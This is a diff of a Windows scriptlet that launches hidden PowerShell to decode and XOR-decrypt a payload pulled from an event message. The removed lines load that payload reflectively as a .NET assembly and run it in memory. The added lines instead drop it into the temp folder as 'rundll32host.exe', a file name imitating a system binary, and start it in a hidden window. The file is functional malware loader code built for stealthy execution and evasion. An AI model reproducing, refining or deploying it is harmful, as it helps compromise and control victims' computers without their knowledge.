@@ -36,8 +36,9 @@ If Len(eventMessage) = 0 Then WScript.Quit
 
 objShell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & _
     "$b=[Convert]::FromBase64String('" & eventMessage & "');" & _
-    "$k=0x77;for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor $k;$k=($k+5)-band 0xFF}" & _
-    "$a=[System.Reflection.Assembly]::Load($b);" & _
-    "$a.GetType('Program').GetMethod('Main').Invoke($null,$null)""", 0, True
+    "$k=0x77;for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor $k;$k=($k+5)-band 0xFF};" & _
+    "$p=$env:TEMP+'\rundll32host.exe';" & _
+    "[IO.File]::WriteAllBytes($p,$b);" & _
+    "Start-Process $p -WindowStyle Hidden""", 0, True
 </script>
 </scriptlet>
